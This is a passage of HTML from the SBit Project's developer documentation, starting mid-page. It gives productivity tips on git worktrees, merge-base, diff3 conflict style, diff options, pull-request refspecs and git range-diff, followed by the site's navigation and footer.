class="token string" style="color:rgb(206, 145, 120)">&quot;</span><span class="token string variable" style="color:rgb(156, 220, 254)">$(</span><span class="token string variable function" style="color:rgb(220, 220, 170)">git</span><span class="token string variable" style="color:rgb(156, 220, 254)"> merge-base master HEAD</span><span class="token string variable" style="color:rgb(156, 220, 254)">)</span><span class="token string" style="color:rgb(206, 145, 120)">&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><hr><div class="admonition admonition-note alert alert--secondary"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></div><div class="admonition-content"><p>This synergizes well with <a href="#cache-compilations-with-ccache"><code>ccache</code></a> as objects resulting from unchanged code will most likely hit the cache and won&#x27;t need to be recompiled.</p></div></div><div class="admonition admonition-note alert alert--secondary"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></div><div class="admonition-content"><p>You can also set up <a href="#reference-prs-easily-with-refspecs">upstream refspecs</a> to refer to pull requests easier in the above <code>git worktree</code> commands.</p></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="writing-code">Writing code<a class="hash-link" href="#writing-code" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="format-cc-diffs-with-clang-format-diffpy">Format C/C++ diffs with <code>clang-format-diff.py</code><a class="hash-link" href="#format-cc-diffs-with-clang-format-diffpy" title="Direct link to heading">​</a></h3><p>See <a href="https://github.com/SBit-Project/sbit/contrib/devtools/README.md#clang-format-diff.py" target="_blank" rel="noopener noreferrer">contrib/devtools/README.md</a>.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="format-python-diffs-with-yapf-diffpy">Format Python diffs with <code>yapf-diff.py</code><a class="hash-link" href="#format-python-diffs-with-yapf-diffpy" title="Direct link to heading">​</a></h3><p>Usage is exactly the same as <a href="#format-cc-diffs-with-clang-format-diffpy"><code>clang-format-diff.py</code></a>. You can get it <a href="https://github.com/MarcoFalke/yapf-diff" target="_blank" rel="noopener noreferrer">here</a>.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="rebasingmerging-code">Rebasing/Merging code<a class="hash-link" href="#rebasingmerging-code" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="more-conflict-context-with-mergeconflictstyle-diff3">More conflict context with <code>merge.conflictstyle diff3</code><a class="hash-link" href="#more-conflict-context-with-mergeconflictstyle-diff3" title="Direct link to heading">​</a></h3><p>For resolving merge/rebase conflicts, it can be useful to enable diff3 style using <code>git config merge.conflictstyle diff3</code>. Instead of</p><div class="codeBlockContainer_I0IT language-diff theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-diff codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(206, 145, 120)">-</span><span class="token deleted-sign deleted line" style="color:rgb(206, 145, 120)">yours</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token deleted-sign deleted line" style="color:rgb(206, 145, 120)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(181, 206, 168)">+</span><span class="token inserted-sign inserted line" style="color:rgb(181, 206, 168)">theirs</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>  you will see</p><div class="codeBlockContainer_I0IT language-diff theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-diff codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(206, 145, 120)">-</span><span class="token deleted-sign deleted line" style="color:rgb(206, 145, 120)">yours</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token deleted-sign deleted line" style="color:rgb(206, 145, 120)"></span><span class="token plain">original</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(181, 206, 168)">+</span><span class="token inserted-sign inserted line" style="color:rgb(181, 206, 168)">theirs</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>This may make it much clearer what caused the conflict. In this style, you can often just look at what changed between <em>original</em> and <em>theirs</em>, and mechanically apply that to <em>yours</em> (or the other way around).</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="reviewing-code">Reviewing code<a class="hash-link" href="#reviewing-code" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="reduce-mental-load-with-git-diff-options">Reduce mental load with <code>git diff</code> options<a class="hash-link" href="#reduce-mental-load-with-git-diff-options" title="Direct link to heading">​</a></h3><p>When reviewing patches which change indentation in C++ files, use <code>git diff -w</code> and <code>git show -w</code>. This makes the diff algorithm ignore whitespace changes. This feature is also available on github.com, by adding <code>?w=1</code> at the end of any URL which shows a diff.</p><p>When reviewing patches that change symbol names in many places, use <code>git diff --word-diff</code>. This will instead of showing the patch as deleted/added <em>lines</em>, show deleted/added <em>words</em>.</p><p>When reviewing patches that move code around, try using <code>git diff --patience commit~:old/file.cpp commit:new/file/name.cpp</code>, and ignoring everything except the moved body of code which should show up as neither <code>+</code> or <code>-</code> lines. In case it was not a pure move, this may even work when combined with the <code>-w</code> or <code>--word-diff</code> options described above. <code>--color-moved=dimmed-zebra</code> will also dim the coloring of moved hunks in the diff on compatible terminals.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="reference-prs-easily-with-refspecs">Reference PRs easily with <code>refspec</code>s<a class="hash-link" href="#reference-prs-easily-with-refspecs" title="Direct link to heading">​</a></h3><p>When looking at other&#x27;s pull requests, it may make sense to add the following section to your <code>.git/config</code> file:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token punctuation" style="color:rgb(212, 212, 212)">[</span><span class="token plain">remote </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;upstream-pull&quot;</span><span class="token punctuation" style="color:rgb(212, 212, 212)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        fetch </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> +refs/pull/*/head:refs/remotes/upstream-pull/*</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        url </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> git@github.com:bitcoin/bitcoin.git</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>This will add an <code>upstream-pull</code> remote to your git repository, which can be fetched using <code>git fetch --all</code> or <code>git fetch upstream-pull</code>. It will download and store on disk quite a lot of data (all PRs, including merged and closed ones). Afterwards, you can use <code>upstream-pull/NUMBER/head</code> in arguments to <code>git show</code>, <code>git checkout</code> and anywhere a commit id would be acceptable to see the changes from pull request NUMBER.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="diff-the-diffs-with-git-range-diff">Diff the diffs with <code>git range-diff</code><a class="hash-link" href="#diff-the-diffs-with-git-range-diff" title="Direct link to heading">​</a></h3><p>It is very common for contributors to rebase their pull requests, or make changes to commits (perhaps in response to review) that are not at the head of their branch. This poses a problem for reviewers as when the contributor force pushes, the reviewer is no longer sure that his previous reviews of commits are still valid (as the commit hashes can now be different even though the diff is semantically the same). <a href="https://git-scm.com/docs/git-range-diff" target="_blank" rel="noopener noreferrer">git range-diff</a> (Git &gt;= 2.19) can help solve this problem by diffing the diffs.</p><p>For example, to identify the differences between your previously reviewed diffs P1-5, and the new diffs P1-2,N3-4 as illustrated below:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">       P1--P2--P3--P4--P5   &lt;-- previously-reviewed-head</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">      /</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">...--m   &lt;-- master</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">      \</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">       P1--P2--N3--N4--N5   &lt;-- new-head (with P3 slightly modified)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>You can do:</p><div class="codeBlockContainer_I0IT language-sh theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-sh codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">git range-diff master previously-reviewed-head new-head</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Note that <code>git range-diff</code> also work for rebases:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">       P1--P2--P3--P4--P5   &lt;-- previously-reviewed-head</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">      /</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">...--m--m1--m2--m3   &lt;-- master</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">                  \</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">                   P1--P2--N3--N4  &lt;-- new-head (with P3 modified, P4 &amp; P5 squashed)</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">PREV=P5 N=4 &amp;&amp; git range-diff `git merge-base --all HEAD $PREV`...$PREV HEAD~$N...HEAD</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Where <code>P5</code> is the commit you last reviewed and <code>4</code> is the number of commits in the new version.</p><hr><p><code>git range-diff</code> also accepts normal <code>git diff</code> options, see <a href="#reduce-mental-load-with-git-diff-options">Reduce mental load with <code>git diff</code> options</a> for useful <code>git diff</code> options.</p><p>You can also set up <a href="#reference-prs-easily-with-refspecs">upstream refspecs</a> to refer to pull requests easier in the above <code>git range-diff</code> commands.</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/sbit.dev/docs/SBit-Core/Development/JSON-RPC-interface"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">JSON-RPC Interface</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/sbit.dev/docs/SBit-Core/Development/release-process"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Release Process</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_cNA8 thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#cache-compilations-with-ccache" class="table-of-contents__link toc-highlight">Cache compilations with <code>ccache</code></a></li><li><a href="#disable-features-with-configure" class="table-of-contents__link toc-highlight">Disable features with <code>./configure</code></a></li><li><a href="#make-use-of-your-threads-with-make--j" class="table-of-contents__link toc-highlight">Make use of your threads with <code>make -j</code></a></li><li><a href="#only-build-what-you-need" class="table-of-contents__link toc-highlight">Only build what you need</a></li><li><a href="#multiple-working-directories-with-git-worktrees" class="table-of-contents__link toc-highlight">Multiple working directories with <code>git worktrees</code></a></li><li><a href="#interactive-dummy-rebases-for-fixups-and-execs-with-git-merge-base" class="table-of-contents__link toc-highlight">Interactive &quot;dummy rebases&quot; for fixups and execs with <code>git merge-base</code></a></li><li><a href="#writing-code" class="table-of-contents__link toc-highlight">Writing code</a><ul><li><a href="#format-cc-diffs-with-clang-format-diffpy" class="table-of-contents__link toc-highlight">Format C/C++ diffs with <code>clang-format-diff.py</code></a></li><li><a href="#format-python-diffs-with-yapf-diffpy" class="table-of-contents__link toc-highlight">Format Python diffs with <code>yapf-diff.py</code></a></li></ul></li><li><a href="#rebasingmerging-code" class="table-of-contents__link toc-highlight">Rebasing/Merging code</a><ul><li><a href="#more-conflict-context-with-mergeconflictstyle-diff3" class="table-of-contents__link toc-highlight">More conflict context with <code>merge.conflictstyle diff3</code></a></li></ul></li><li><a href="#reviewing-code" class="table-of-contents__link toc-highlight">Reviewing code</a><ul><li><a href="#reduce-mental-load-with-git-diff-options" class="table-of-contents__link toc-highlight">Reduce mental load with <code>git diff</code> options</a></li><li><a href="#reference-prs-easily-with-refspecs" class="table-of-contents__link toc-highlight">Reference PRs easily with <code>refspec</code>s</a></li><li><a href="#diff-the-diffs-with-git-range-diff" class="table-of-contents__link toc-highlight">Diff the diffs with <code>git range-diff</code></a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Get in touch</div><ul class="footer__items"><li class="footer__item"><a href="mailto: dev@sbit.dev" target="_blank" rel="noopener noreferrer" class="footer__link-item">Contact<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/docs/welcome">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items"><li class="footer__item"><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Instagram<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/SBit-Project/Book" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2022 - SBit Project</div></div></div></footer></div>
<script src="/sbit.dev/assets/js/runtime~main.f7c96534.js"></script>
<script src="/sbit.dev/assets/js/main.73c60966.js"></script>
</body>
</html>